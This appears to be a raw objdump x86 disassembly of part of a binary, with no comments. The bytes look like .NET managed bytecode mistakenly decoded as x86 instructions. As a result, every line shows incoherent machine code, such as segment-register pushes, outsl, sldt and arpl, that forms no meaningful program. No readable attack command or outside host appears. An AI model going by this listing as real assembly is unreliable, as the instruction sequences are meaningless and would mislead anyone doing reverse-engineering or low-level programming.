  4046b0:	57                   	push   %edi
  4046b1:	00 70 6f             	add    %dh,0x6f(%eax)
  4046b4:	4b                   	dec    %ebx
  4046b5:	00 00                	add    %al,(%eax)
  4046b7:	0a 13                	or     (%ebx),%dl
  4046b9:	08 11                	or     %dl,(%ecx)
  4046bb:	08 2c 04             	or     %ch,(%esp,%eax,1)
  4046be:	00 17                	add    %dl,(%edi)
  4046c0:	0d 00 28 20 00       	or     $0x202800,%eax
  4046c5:	00 06                	add    %al,(%esi)
  4046c7:	00 73 4d             	add    %dh,0x4d(%ebx)
  4046ca:	00 00                	add    %al,(%eax)
  4046cc:	0a 13                	or     (%ebx),%dl
  4046ce:	04 11                	add    $0x11,%al
  4046d0:	04 28                	add    $0x28,%al
  4046d2:	08 00                	or     %al,(%eax)
  4046d4:	00 06                	add    %al,(%esi)
  4046d6:	6f                   	outsl  %ds:(%esi),(%dx)
  4046d7:	4e                   	dec    %esi
  4046d8:	00 00                	add    %al,(%eax)
  4046da:	0a 00                	or     (%eax),%al
  4046dc:	11 04 06             	adc    %eax,(%esi,%eax,1)
  4046df:	28 2b                	sub    %ch,(%ebx)
  4046e1:	00 00                	add    %al,(%eax)
  4046e3:	06                   	push   %es
  4046e4:	16                   	push   %ss
  4046e5:	fe 01                	incb   (%ecx)
  4046e7:	13 09                	adc    (%ecx),%ecx
  4046e9:	11 09                	adc    %ecx,(%ecx)
  4046eb:	2c 03                	sub    $0x3,%al
  4046ed:	00 2b                	add    %ch,(%ebx)
  4046ef:	7d 07                	jge    0x4046f8
  4046f1:	72 fe                	jb     0x4046f1
  4046f3:	4f                   	dec    %edi
  4046f4:	00 70 28             	add    %dh,0x28(%eax)
  4046f7:	4f                   	dec    %edi
  4046f8:	00 00                	add    %al,(%eax)
  4046fa:	0a 13                	or     (%ebx),%dl
  4046fc:	0a 11                	or     (%ecx),%dl
  4046fe:	0a 2c 61             	or     (%ecx,%eiz,2),%ch
  404701:	00 11                	add    %dl,(%ecx)
  404703:	04 07                	add    $0x7,%al
  404705:	28 14 00             	sub    %dl,(%eax,%eax,1)
  404708:	00 06                	add    %al,(%esi)
  40470a:	16                   	push   %ss
  40470b:	fe 01                	incb   (%ecx)
  40470d:	13 0b                	adc    (%ebx),%ecx
  40470f:	11 0b                	adc    %ecx,(%ebx)
  404711:	2c 03                	sub    $0x3,%al
  404713:	00 2b                	add    %ch,(%ebx)
  404715:	57                   	push   %edi
  404716:	11 04 08             	adc    %eax,(%eax,%ecx,1)
  404719:	28 15 00 00 06 16    	sub    %dl,0x16060000
  40471f:	fe 01                	incb   (%ecx)
  404721:	13 0c 11             	adc    (%ecx,%edx,1),%ecx
  404724:	0c 2c                	or     $0x2c,%al
  404726:	03 00                	add    (%eax),%eax
  404728:	2b 43 11             	sub    0x11(%ebx),%eax
  40472b:	04 7e                	add    $0x7e,%al
  40472d:	15 00 00 04 28       	adc    $0x28040000,%eax
  404732:	19 00                	sbb    %eax,(%eax)
  404734:	00 06                	add    %al,(%esi)
  404736:	16                   	push   %ss
  404737:	fe 01                	incb   (%ecx)
  404739:	13 0d 11 0d 2c 03    	adc    0x32c0d11,%ecx
  40473f:	00 2b                	add    %ch,(%ebx)
  404741:	2b 09                	sub    (%ecx),%ecx
  404743:	16                   	push   %ss
  404744:	fe 01                	incb   (%ecx)
  404746:	13 0e                	adc    (%esi),%ecx
  404748:	11 0e                	adc    %ecx,(%esi)
  40474a:	2c 15                	sub    $0x15,%al
  40474c:	00 11                	add    %dl,(%ecx)
  40474e:	04 28                	add    $0x28,%al
  404750:	17                   	pop    %ss
  404751:	00 00                	add    %al,(%eax)
  404753:	06                   	push   %es
  404754:	16                   	push   %ss
  404755:	fe 01                	incb   (%ecx)
  404757:	13 0f                	adc    (%edi),%ecx
  404759:	11 0f                	adc    %ecx,(%edi)
  40475b:	2c 03                	sub    $0x3,%al
  40475d:	00 2b                	add    %ch,(%ebx)
  40475f:	0d 00 00 72 c7       	or     $0xc7720000,%eax
  404764:	57                   	push   %edi
  404765:	00 70 28             	add    %dh,0x28(%eax)
  404768:	1e                   	push   %ds
  404769:	00 00                	add    %al,(%eax)
  40476b:	0a 00                	or     (%eax),%al
  40476d:	2a 22                	sub    (%edx),%ah
  40476f:	02 28                	add    (%eax),%ch
  404771:	25 00 00 0a 00       	and    $0xa0000,%eax
  404776:	2a 1a                	sub    (%edx),%bl
  404778:	72 f7                	jb     0x404771
  40477a:	57                   	push   %edi
  40477b:	00 70 2a             	add    %dh,0x2a(%eax)
  40477e:	7a 00                	jp     0x404780
  404780:	72 05                	jb     0x404787
  404782:	58                   	pop    %eax
  404783:	00 70 28             	add    %dh,0x28(%eax)
  404786:	1e                   	push   %ds
  404787:	00 00                	add    %al,(%eax)
  404789:	0a 00                	or     (%eax),%al
  40478b:	28 0e                	sub    %cl,(%esi)
  40478d:	00 00                	add    %al,(%eax)
  40478f:	06                   	push   %es
  404790:	26 72 43             	es jb  0x4047d6
  404793:	58                   	pop    %eax
  404794:	00 70 28             	add    %dh,0x28(%eax)
  404797:	1e                   	push   %ds
  404798:	00 00                	add    %al,(%eax)
  40479a:	0a 00                	or     (%eax),%al
  40479c:	2a 22                	sub    (%edx),%ah
  40479e:	02 28                	add    (%eax),%ch
  4047a0:	25 00 00 0a 00       	and    $0xa0000,%eax
  4047a5:	2a 1a                	sub    (%edx),%bl
  4047a7:	72 73                	jb     0x40481c
  4047a9:	58                   	pop    %eax
  4047aa:	00 70 2a             	add    %dh,0x2a(%eax)
  4047ad:	00 00                	add    %al,(%eax)
  4047af:	00 13                	add    %dl,(%ebx)
  4047b1:	30 02                	xor    %al,(%edx)
  4047b3:	00 4c 00 00          	add    %cl,0x0(%eax,%eax,1)
  4047b7:	00 1f                	add    %bl,(%edi)
  4047b9:	00 00                	add    %al,(%eax)
  4047bb:	11 00                	adc    %eax,(%eax)
  4047bd:	72 83                	jb     0x404742
  4047bf:	58                   	pop    %eax
  4047c0:	00 70 28             	add    %dh,0x28(%eax)
  4047c3:	1e                   	push   %ds
  4047c4:	00 00                	add    %al,(%eax)
  4047c6:	0a 00                	or     (%eax),%al
  4047c8:	28 20                	sub    %ah,(%eax)
  4047ca:	00 00                	add    %al,(%eax)
  4047cc:	06                   	push   %es
  4047cd:	00 73 4d             	add    %dh,0x4d(%ebx)
  4047d0:	00 00                	add    %al,(%eax)
  4047d2:	0a 0a                	or     (%edx),%cl
  4047d4:	06                   	push   %es
  4047d5:	28 08                	sub    %cl,(%eax)
  4047d7:	00 00                	add    %al,(%eax)
  4047d9:	06                   	push   %es
  4047da:	6f                   	outsl  %ds:(%esi),(%dx)
  4047db:	4e                   	dec    %esi
  4047dc:	00 00                	add    %al,(%eax)
  4047de:	0a 00                	or     (%eax),%al
  4047e0:	06                   	push   %es
  4047e1:	28 0a                	sub    %cl,(%edx)
  4047e3:	00 00                	add    %al,(%eax)
  4047e5:	06                   	push   %es
  4047e6:	26 06                	es push %es
  4047e8:	28 0b                	sub    %cl,(%ebx)
  4047ea:	00 00                	add    %al,(%eax)
  4047ec:	06                   	push   %es
  4047ed:	26 06                	es push %es
  4047ef:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  4047f2:	00 06                	add    %al,(%esi)
  4047f4:	26 06                	es push %es
  4047f6:	28 0d 00 00 06 26    	sub    %cl,0x26060000
  4047fc:	72 c3                	jb     0x4047c1
  4047fe:	58                   	pop    %eax
  4047ff:	00 70 28             	add    %dh,0x28(%eax)
  404802:	1e                   	push   %ds
  404803:	00 00                	add    %al,(%eax)
  404805:	0a 00                	or     (%eax),%al
  404807:	2a 22                	sub    (%edx),%ah
  404809:	02 28                	add    (%eax),%ch
  40480b:	25 00 00 0a 00       	and    $0xa0000,%eax
  404810:	2a 00                	sub    (%eax),%al
  404812:	00 00                	add    %al,(%eax)
  404814:	1b 30                	sbb    (%eax),%esi
  404816:	05 00 c5 00 00       	add    $0xc500,%eax
  40481b:	00 20                	add    %ah,(%eax)
  40481d:	00 00                	add    %al,(%eax)
  40481f:	11 00                	adc    %eax,(%eax)
  404821:	73 50                	jae    0x404873
  404823:	00 00                	add    %al,(%eax)
  404825:	0a 0a                	or     (%edx),%cl
  404827:	00 00                	add    %al,(%eax)
  404829:	02 6f 51             	add    0x51(%edi),%ch
  40482c:	00 00                	add    %al,(%eax)
  40482e:	0a 0b                	or     (%ebx),%cl
  404830:	2b 78 07             	sub    0x7(%eax),%edi
  404833:	6f                   	outsl  %ds:(%esi),(%dx)
  404834:	52                   	push   %edx
  404835:	00 00                	add    %al,(%eax)
  404837:	0a 0c 00             	or     (%eax,%eax,1),%cl
  40483a:	08 1f                	or     %bl,(%edi)
  40483c:	3a 6f 53             	cmp    0x53(%edi),%ch
  40483f:	00 00                	add    %al,(%eax)
  404841:	0a 0d 09 16 fe 02    	or     0x2fe1609,%cl
  404847:	13 04 11             	adc    (%ecx,%edx,1),%eax
  40484a:	04 2c                	add    $0x2c,%al
  40484c:	1c 00                	sbb    $0x0,%al
  40484e:	06                   	push   %es
  40484f:	08 16                	or     %dl,(%esi)
  404851:	09 6f 44             	or     %ebp,0x44(%edi)
  404854:	00 00                	add    %al,(%eax)
  404856:	0a 08                	or     (%eax),%cl
  404858:	09 17                	or     %edx,(%edi)
  40485a:	58                   	pop    %eax
  40485b:	6f                   	outsl  %ds:(%esi),(%dx)
  40485c:	54                   	push   %esp
  40485d:	00 00                	add    %al,(%eax)
  40485f:	0a 6f 55             	or     0x55(%edi),%ch
  404862:	00 00                	add    %al,(%eax)
  404864:	0a 00                	or     (%eax),%al
  404866:	00 2b                	add    %ch,(%ebx)
  404868:	40                   	inc    %eax
  404869:	00 08                	add    %cl,(%eax)
  40486b:	1f                   	pop    %ds
  40486c:	3d 6f 53 00 00       	cmp    $0x536f,%eax
  404871:	0a 0d 09 16 fe 02    	or     0x2fe1609,%cl
  404877:	13 05 11 05 2c 1c    	adc    0x1c2c0511,%eax
  40487d:	00 06                	add    %al,(%esi)
  40487f:	08 16                	or     %dl,(%esi)
  404881:	09 6f 44             	or     %ebp,0x44(%edi)
  404884:	00 00                	add    %al,(%eax)
  404886:	0a 08                	or     (%eax),%cl
  404888:	09 17                	or     %edx,(%edi)
  40488a:	58                   	pop    %eax
  40488b:	6f                   	outsl  %ds:(%esi),(%dx)
  40488c:	54                   	push   %esp
  40488d:	00 00                	add    %al,(%eax)
  40488f:	0a 6f 55             	or     0x55(%edi),%ch
  404892:	00 00                	add    %al,(%eax)
  404894:	0a 00                	or     (%eax),%al
  404896:	00 2b                	add    %ch,(%ebx)
  404898:	0f 00 06             	sldt   (%esi)
  40489b:	08 7e 23             	or     %bh,0x23(%esi)
  40489e:	00 00                	add    %al,(%eax)
  4048a0:	0a 6f 55             	or     0x55(%edi),%ch
  4048a3:	00 00                	add    %al,(%eax)
  4048a5:	0a 00                	or     (%eax),%al
  4048a7:	00 00                	add    %al,(%eax)
  4048a9:	00 07                	add    %al,(%edi)
  4048ab:	6f                   	outsl  %ds:(%esi),(%dx)
  4048ac:	56                   	push   %esi
  4048ad:	00 00                	add    %al,(%eax)
  4048af:	0a 2d 80 de 0b 07    	or     0x70bde80,%ch
  4048b5:	2c 07                	sub    $0x7,%al
  4048b7:	07                   	pop    %es
  4048b8:	6f                   	outsl  %ds:(%esi),(%dx)
  4048b9:	57                   	push   %edi
  4048ba:	00 00                	add    %al,(%eax)
  4048bc:	0a 00                	or     (%eax),%al
  4048be:	dc 06                	faddl  (%esi)
  4048c0:	28 49 00             	sub    %cl,0x0(%ecx)
  4048c3:	00 06                	add    %al,(%esi)
  4048c5:	13 06                	adc    (%esi),%eax
  4048c7:	de 19                	ficomps (%ecx)
  4048c9:	13 07                	adc    (%edi),%eax
  4048cb:	00 11                	add    %dl,(%ecx)
  4048cd:	07                   	pop    %es
  4048ce:	6f                   	outsl  %ds:(%esi),(%dx)
  4048cf:	21 00                	and    %eax,(%eax)
  4048d1:	00 0a                	add    %cl,(%edx)
  4048d3:	28 58 00             	sub    %bl,0x0(%eax)
  4048d6:	00 0a                	add    %cl,(%edx)
  4048d8:	00 28                	add    %ch,(%eax)
  4048da:	4a                   	dec    %edx
  4048db:	00 00                	add    %al,(%eax)
  4048dd:	06                   	push   %es
  4048de:	13 06                	adc    (%esi),%eax
  4048e0:	de 00                	fiadds (%eax)
  4048e2:	11 06                	adc    %eax,(%esi)
  4048e4:	2a 00                	sub    (%eax),%al
  4048e6:	00 00                	add    %al,(%eax)
  4048e8:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  4048eb:	00 02                	add    %al,(%edx)
  4048ed:	00 10                	add    %dl,(%eax)
  4048ef:	00 84 94 00 0b 00 00 	add    %al,0xb00(%esp,%edx,4)
  4048f6:	00 00                	add    %al,(%eax)
  4048f8:	00 00                	add    %al,(%eax)
  4048fa:	07                   	pop    %es
  4048fb:	00 a2 a9 00 19 16    	add    %ah,0x161900a9(%edx)
  404901:	00 00                	add    %al,(%eax)
  404903:	01 1e                	add    %ebx,(%esi)
  404905:	02 7b 20             	add    0x20(%ebx),%bh
  404908:	00 00                	add    %al,(%eax)
  40490a:	04 2a                	add    $0x2a,%al
  40490c:	1e                   	push   %ds
  40490d:	02 7b 21             	add    0x21(%ebx),%bh
  404910:	00 00                	add    %al,(%eax)
  404912:	04 2a                	add    $0x2a,%al
  404914:	5e                   	pop    %esi
  404915:	02 28                	add    (%eax),%ch
  404917:	25 00 00 0a 00       	and    $0xa0000,%eax
  40491c:	00 02                	add    %al,(%edx)
  40491e:	03 7d 20             	add    0x20(%ebp),%edi
  404921:	00 00                	add    %al,(%eax)
  404923:	04 02                	add    $0x2,%al
  404925:	04 7d                	add    $0x7d,%al
  404927:	21 00                	and    %eax,(%eax)
  404929:	00 04 2a             	add    %al,(%edx,%ebp,1)
  40492c:	22 17                	and    (%edi),%dl
  40492e:	02 73 48             	add    0x48(%ebx),%dh
  404931:	00 00                	add    %al,(%eax)
  404933:	06                   	push   %es
  404934:	2a 22                	sub    (%edx),%ah
  404936:	16                   	push   %ss
  404937:	14 73                	adc    $0x73,%al
  404939:	48                   	dec    %eax
  40493a:	00 00                	add    %al,(%eax)
  40493c:	06                   	push   %es
  40493d:	2a 00                	sub    (%eax),%al
  40493f:	00 13                	add    %dl,(%ebx)
  404941:	30 04 00             	xor    %al,(%eax,%eax,1)
  404944:	34 01                	xor    $0x1,%al
  404946:	00 00                	add    %al,(%eax)
  404948:	00 00                	add    %al,(%eax)
  40494a:	00 00                	add    %al,(%eax)
  40494c:	02 73 59             	add    0x59(%ebx),%dh
  40494f:	00 00                	add    %al,(%eax)
  404951:	0a 7d 22             	or     0x22(%ebp),%bh
  404954:	00 00                	add    %al,(%eax)
  404956:	04 02                	add    $0x2,%al
  404958:	28 25 00 00 0a 00    	sub    %ah,0xa0000
  40495e:	00 02                	add    %al,(%edx)
  404960:	7b 22                	jnp    0x404984
  404962:	00 00                	add    %al,(%eax)
  404964:	04 28                	add    $0x28,%al
  404966:	37                   	aaa
  404967:	00 00                	add    %al,(%eax)
  404969:	06                   	push   %es
  40496a:	7e 34                	jle    0x4049a0
  40496c:	00 00                	add    %al,(%eax)
  40496e:	04 25                	add    $0x25,%al
  404970:	2d 17 26 7e 33       	sub    $0x337e2617,%eax
  404975:	00 00                	add    %al,(%eax)
  404977:	04 fe                	add    $0xfe,%al
  404979:	06                   	push   %es
  40497a:	59                   	pop    %ecx
  40497b:	00 00                	add    %al,(%eax)
  40497d:	06                   	push   %es
  40497e:	73 5a                	jae    0x4049da
  404980:	00 00                	add    %al,(%eax)
  404982:	0a 25 80 34 00 00    	or     0x3480,%ah
  404988:	04 6f                	add    $0x6f,%al
  40498a:	5b                   	pop    %ebx
  40498b:	00 00                	add    %al,(%eax)
  40498d:	0a 00                	or     (%eax),%al
  40498f:	02 7b 22             	add    0x22(%ebx),%bh
  404992:	00 00                	add    %al,(%eax)
  404994:	04 28                	add    $0x28,%al
  404996:	31 00                	xor    %eax,(%eax)
  404998:	00 06                	add    %al,(%esi)
  40499a:	7e 35                	jle    0x4049d1
  40499c:	00 00                	add    %al,(%eax)
  40499e:	04 25                	add    $0x25,%al
  4049a0:	2d 17 26 7e 33       	sub    $0x337e2617,%eax
  4049a5:	00 00                	add    %al,(%eax)
  4049a7:	04 fe                	add    $0xfe,%al
  4049a9:	06                   	push   %es
  4049aa:	5a                   	pop    %edx
  4049ab:	00 00                	add    %al,(%eax)
  4049ad:	06                   	push   %es
  4049ae:	73 5a                	jae    0x404a0a
  4049b0:	00 00                	add    %al,(%eax)
  4049b2:	0a 25 80 35 00 00    	or     0x3580,%ah
  4049b8:	04 6f                	add    $0x6f,%al
  4049ba:	5b                   	pop    %ebx
  4049bb:	00 00                	add    %al,(%eax)
  4049bd:	0a 00                	or     (%eax),%al
  4049bf:	02 7b 22             	add    0x22(%ebx),%bh
  4049c2:	00 00                	add    %al,(%eax)
  4049c4:	04 28                	add    $0x28,%al
  4049c6:	34 00                	xor    $0x0,%al
  4049c8:	00 06                	add    %al,(%esi)
  4049ca:	7e 36                	jle    0x404a02
  4049cc:	00 00                	add    %al,(%eax)
  4049ce:	04 25                	add    $0x25,%al
  4049d0:	2d 17 26 7e 33       	sub    $0x337e2617,%eax
  4049d5:	00 00                	add    %al,(%eax)
  4049d7:	04 fe                	add    $0xfe,%al
  4049d9:	06                   	push   %es
  4049da:	5b                   	pop    %ebx
  4049db:	00 00                	add    %al,(%eax)
  4049dd:	06                   	push   %es
  4049de:	73 5a                	jae    0x404a3a
  4049e0:	00 00                	add    %al,(%eax)
  4049e2:	0a 25 80 36 00 00    	or     0x3680,%ah
  4049e8:	04 6f                	add    $0x6f,%al
  4049ea:	5b                   	pop    %ebx
  4049eb:	00 00                	add    %al,(%eax)
  4049ed:	0a 00                	or     (%eax),%al
  4049ef:	02 7b 22             	add    0x22(%ebx),%bh
  4049f2:	00 00                	add    %al,(%eax)
  4049f4:	04 28                	add    $0x28,%al
  4049f6:	3b 00                	cmp    (%eax),%eax
  4049f8:	00 06                	add    %al,(%esi)
  4049fa:	7e 37                	jle    0x404a33
  4049fc:	00 00                	add    %al,(%eax)
  4049fe:	04 25                	add    $0x25,%al
  404a00:	2d 17 26 7e 33       	sub    $0x337e2617,%eax
  404a05:	00 00                	add    %al,(%eax)
  404a07:	04 fe                	add    $0xfe,%al
  404a09:	06                   	push   %es
  404a0a:	5c                   	pop    %esp
  404a0b:	00 00                	add    %al,(%eax)
  404a0d:	06                   	push   %es
  404a0e:	73 5a                	jae    0x404a6a
  404a10:	00 00                	add    %al,(%eax)
  404a12:	0a 25 80 37 00 00    	or     0x3780,%ah
  404a18:	04 6f                	add    $0x6f,%al
  404a1a:	5b                   	pop    %ebx
  404a1b:	00 00                	add    %al,(%eax)
  404a1d:	0a 00                	or     (%eax),%al
  404a1f:	02 7b 22             	add    0x22(%ebx),%bh
  404a22:	00 00                	add    %al,(%eax)
  404a24:	04 28                	add    $0x28,%al
  404a26:	42                   	inc    %edx
  404a27:	00 00                	add    %al,(%eax)
  404a29:	06                   	push   %es
  404a2a:	7e 38                	jle    0x404a64
  404a2c:	00 00                	add    %al,(%eax)
  404a2e:	04 25                	add    $0x25,%al
  404a30:	2d 17 26 7e 33       	sub    $0x337e2617,%eax
  404a35:	00 00                	add    %al,(%eax)
  404a37:	04 fe                	add    $0xfe,%al
  404a39:	06                   	push   %es
  404a3a:	5d                   	pop    %ebp
  404a3b:	00 00                	add    %al,(%eax)
  404a3d:	06                   	push   %es
  404a3e:	73 5a                	jae    0x404a9a
  404a40:	00 00                	add    %al,(%eax)
  404a42:	0a 25 80 38 00 00    	or     0x3880,%ah
  404a48:	04 6f                	add    $0x6f,%al
  404a4a:	5b                   	pop    %ebx
  404a4b:	00 00                	add    %al,(%eax)
  404a4d:	0a 00                	or     (%eax),%al
  404a4f:	02 7b 22             	add    0x22(%ebx),%bh
  404a52:	00 00                	add    %al,(%eax)
  404a54:	04 28                	add    $0x28,%al
  404a56:	3f                   	aas
  404a57:	00 00                	add    %al,(%eax)
  404a59:	06                   	push   %es
  404a5a:	7e 39                	jle    0x404a95
  404a5c:	00 00                	add    %al,(%eax)
  404a5e:	04 25                	add    $0x25,%al
  404a60:	2d 17 26 7e 33       	sub    $0x337e2617,%eax
  404a65:	00 00                	add    %al,(%eax)
  404a67:	04 fe                	add    $0xfe,%al
  404a69:	06                   	push   %es
  404a6a:	5e                   	pop    %esi
  404a6b:	00 00                	add    %al,(%eax)
  404a6d:	06                   	push   %es
  404a6e:	73 5a                	jae    0x404aca
  404a70:	00 00                	add    %al,(%eax)
  404a72:	0a 25 80 39 00 00    	or     0x3980,%ah
  404a78:	04 6f                	add    $0x6f,%al
  404a7a:	5b                   	pop    %ebx
  404a7b:	00 00                	add    %al,(%eax)
  404a7d:	0a 00                	or     (%eax),%al
  404a7f:	2a 13                	sub    (%ebx),%dl
  404a81:	30 02                	xor    %al,(%edx)
  404a83:	00 47 00             	add    %al,0x0(%edi)
  404a86:	00 00                	add    %al,(%eax)
  404a88:	21 00                	and    %eax,(%eax)
  404a8a:	00 11                	add    %dl,(%ecx)
  404a8c:	00 03                	add    %al,(%ebx)
  404a8e:	28 5c 00 00          	sub    %bl,0x0(%eax,%eax,1)
  404a92:	0a 2d 11 02 7b 22    	or     0x227b0211,%ch
  404a98:	00 00                	add    %al,(%eax)
  404a9a:	04 03                	add    $0x3,%al
  404a9c:	6f                   	outsl  %ds:(%esi),(%dx)
  404a9d:	5d                   	pop    %ebp
  404a9e:	00 00                	add    %al,(%eax)
  404aa0:	0a 16                	or     (%esi),%dl
  404aa2:	fe 01                	incb   (%ecx)
  404aa4:	2b 01                	sub    (%ecx),%eax
  404aa6:	17                   	pop    %ss
  404aa7:	0b 07                	or     (%edi),%eax
  404aa9:	2c 04                	sub    $0x4,%al
  404aab:	16                   	push   %ss
  404aac:	0a 2b                	or     (%ebx),%ch
  404aae:	1e                   	push   %ds
  404aaf:	00 02                	add    %al,(%edx)
  404ab1:	7b 22                	jnp    0x404ad5
  404ab3:	00 00                	add    %al,(%eax)
  404ab5:	04 03                	add    $0x3,%al
  404ab7:	6f                   	outsl  %ds:(%esi),(%dx)
  404ab8:	5e                   	pop    %esi
  404ab9:	00 00                	add    %al,(%eax)
  404abb:	0a 6f 5f             	or     0x5f(%edi),%ch
  404abe:	00 00                	add    %al,(%eax)
  404ac0:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  404ac3:	04 6f                	add    $0x6f,%al
  404ac5:	3e 00 00             	add    %al,%ds:(%eax)
  404ac8:	06                   	push   %es
  404ac9:	00 17                	add    %dl,(%edi)
  404acb:	0a 00                	or     (%eax),%al
  404acd:	06                   	push   %es
  404ace:	0d 2b 00 09 2a       	or     $0x2a09002b,%eax
  404ad3:	00 13                	add    %dl,(%ebx)
  404ad5:	30 01                	xor    %al,(%ecx)
  404ad7:	00 0f                	add    %cl,(%edi)
  404ad9:	00 00                	add    %al,(%eax)
  404adb:	00 22                	add    %ah,(%edx)
  404add:	00 00                	add    %al,(%eax)
  404adf:	11 00                	adc    %eax,(%eax)
  404ae1:	72 f5                	jb     0x404ad8
  404ae3:	58                   	pop    %eax
  404ae4:	00 70 0a             	add    %dh,0xa(%eax)
  404ae7:	06                   	push   %es
  404ae8:	28 1e                	sub    %bl,(%esi)
  404aea:	00 00                	add    %al,(%eax)
  404aec:	0a 00                	or     (%eax),%al
  404aee:	2a 00                	sub    (%eax),%al
  404af0:	13 30                	adc    (%eax),%esi
  404af2:	01 00                	add    %eax,(%eax)
  404af4:	0f 00 00             	sldt   (%eax)
  404af7:	00 22                	add    %ah,(%edx)
  404af9:	00 00                	add    %al,(%eax)
  404afb:	11 00                	adc    %eax,(%eax)
  404afd:	72 d2                	jb     0x404ad1
  404aff:	5b                   	pop    %ebx
  404b00:	00 70 0a             	add    %dh,0xa(%eax)
  404b03:	06                   	push   %es
  404b04:	28 1e                	sub    %bl,(%esi)
  404b06:	00 00                	add    %al,(%eax)
  404b08:	0a 00                	or     (%eax),%al
  404b0a:	2a 7e 20             	sub    0x20(%esi),%bh
  404b0d:	02 00                	add    (%eax),%al
  404b0f:	00 80 73 60 00 00    	add    %al,0x6073(%eax)
  404b15:	0a 80 31 00 00 04    	or     0x4000031(%eax),%al
  404b1b:	20 01                	and    %al,(%ecx)
  404b1d:	00 00                	add    %al,(%eax)
  404b1f:	80 73 60 00          	xorb   $0x0,0x60(%ebx)
  404b23:	00 0a                	add    %cl,(%edx)
  404b25:	80 32 00             	xorb   $0x0,(%edx)
  404b28:	00 04 2a             	add    %al,(%edx,%ebp,1)
  404b2b:	00 13                	add    %dl,(%ebx)
  404b2d:	30 04 00             	xor    %al,(%eax,%eax,1)
  404b30:	13 00                	adc    (%eax),%eax
  404b32:	00 00                	add    %al,(%eax)
  404b34:	22 00                	and    (%eax),%al
  404b36:	00 11                	add    %dl,(%ecx)
  404b38:	00 02                	add    %al,(%edx)
  404b3a:	03 20                	add    (%eax),%esp
  404b3c:	00 01                	add    %al,(%ecx)
  404b3e:	00 00                	add    %al,(%eax)
  404b40:	04 28                	add    $0x28,%al
  404b42:	55                   	push   %ebp
  404b43:	00 00                	add    %al,(%eax)
  404b45:	06                   	push   %es
  404b46:	0a 2b                	or     (%ebx),%ch
  404b48:	00 06                	add    %al,(%esi)
  404b4a:	2a 00                	sub    (%eax),%al
  404b4c:	13 30                	adc    (%eax),%esi
  404b4e:	04 00                	add    $0x0,%al
  404b50:	13 00                	adc    (%eax),%eax
  404b52:	00 00                	add    %al,(%eax)
  404b54:	22 00                	and    (%eax),%al
  404b56:	00 11                	add    %dl,(%ecx)
  404b58:	00 02                	add    %al,(%edx)
  404b5a:	03 20                	add    (%eax),%esp
  404b5c:	00 02                	add    %al,(%edx)
  404b5e:	00 00                	add    %al,(%eax)
  404b60:	04 28                	add    $0x28,%al
  404b62:	55                   	push   %ebp
  404b63:	00 00                	add    %al,(%eax)
  404b65:	06                   	push   %es
  404b66:	0a 2b                	or     (%ebx),%ch
  404b68:	00 06                	add    %al,(%esi)
  404b6a:	2a 00                	sub    (%eax),%al
  404b6c:	1b 30                	sbb    (%eax),%esi
  404b6e:	06                   	push   %es
  404b6f:	00 98 00 00 00 23    	add    %bl,0x23000000(%eax)
  404b75:	00 00                	add    %al,(%eax)
  404b77:	11 00                	adc    %eax,(%eax)
  404b79:	16                   	push   %ss
  404b7a:	0a 00                	or     (%eax),%al
  404b7c:	7e 31                	jle    0x404baf
  404b7e:	00 00                	add    %al,(%eax)
  404b80:	04 03                	add    $0x3,%al
  404b82:	16                   	push   %ss
  404b83:	17                   	pop    %ss
  404b84:	04 60                	add    $0x60,%al
  404b86:	12 00                	adc    (%eax),%al
  404b88:	28 50 00             	sub    %dl,0x0(%eax)
  404b8b:	00 06                	add    %al,(%esi)
  404b8d:	0b 07                	or     (%edi),%eax
  404b8f:	16                   	push   %ss
  404b90:	fe 03                	incb   (%ebx)
  404b92:	13 07                	adc    (%edi),%eax
  404b94:	11 07                	adc    %eax,(%edi)
  404b96:	2c 0a                	sub    $0xa,%al
  404b98:	00 72 9a             	add    %dh,-0x66(%edx)
  404b9b:	45                   	inc    %ebp
  404b9c:	00 70 13             	add    %dh,0x13(%eax)
  404b9f:	08 de                	or     %bl,%dh
  404ba1:	6b 16 0c             	imul   $0xc,(%esi),%edx
  404ba4:	20 00                	and    %al,(%eax)
  404ba6:	04 00                	add    $0x0,%al
  404ba8:	00 0d 20 00 04 00    	add    %cl,0x40020
  404bae:	00 73 61             	add    %dh,0x61(%ebx)
  404bb1:	00 00                	add    %al,(%eax)
  404bb3:	0a 13                	or     (%ebx),%dl
  404bb5:	04 06                	add    $0x6,%al
  404bb7:	05 16 12 02 11       	add    $0x11021216,%eax
  404bbc:	04 12                	add    $0x12,%al
  404bbe:	03 28                	add    (%eax),%ebp
  404bc0:	52                   	push   %edx
  404bc1:	00 00                	add    %al,(%eax)
  404bc3:	06                   	push   %es
  404bc4:	13 05 11 05 16 fe    	adc    0xfe160511,%eax
  404bca:	03 13                	add    (%ebx),%edx
  404bcc:	09 11                	or     %edx,(%ecx)
  404bce:	09 2c 0a             	or     %ebp,(%edx,%ecx,1)
  404bd1:	00 72 9a             	add    %dh,-0x66(%edx)
  404bd4:	45                   	inc    %ebp
  404bd5:	00 70 13             	add    %dh,0x13(%eax)
  404bd8:	08 de                	or     %bl,%dh
  404bda:	32 28                	xor    (%eax),%ch
  404bdc:	62 00                	bound  %eax,(%eax)
  404bde:	00 0a                	add    %cl,(%edx)
  404be0:	11 04 6f             	adc    %eax,(%edi,%ebp,2)
  404be3:	14 00                	adc    $0x0,%al
  404be5:	00 0a                	add    %cl,(%edx)
  404be7:	6f                   	outsl  %ds:(%esi),(%dx)
  404be8:	63 00                	arpl   %eax,(%eax)
  404bea:	00 0a                	add    %cl,(%edx)
  404bec:	13 06                	adc    (%esi),%eax
  404bee:	11 06                	adc    %eax,(%esi)
  404bf0:	28 56 00             	sub    %dl,0x0(%esi)
  404bf3:	00 06                	add    %al,(%esi)
  404bf5:	13 08                	adc    (%eax),%ecx
  404bf7:	de 14 00             	ficoms (%eax,%eax,1)
  404bfa:	06                   	push   %es
  404bfb:	16                   	push   %ss
  404bfc:	fe 03                	incb   (%ebx)
  404bfe:	13 0a                	adc    (%edx),%ecx
  404c00:	11 0a                	adc    %ecx,(%edx)
  404c02:	2c 07                	sub    $0x7,%al
  404c04:	06                   	push   %es
  404c05:	28 51 00             	sub    %dl,0x0(%ecx)
  404c08:	00 06                	add    %al,(%esi)
  404c0a:	26 00 dc             	es add %bl,%ah
  404c0d:	11 08                	adc    %ecx,(%eax)
  404c0f:	2a 01                	sub    (%ecx),%al
  404c11:	10 00                	adc    %al,(%eax)
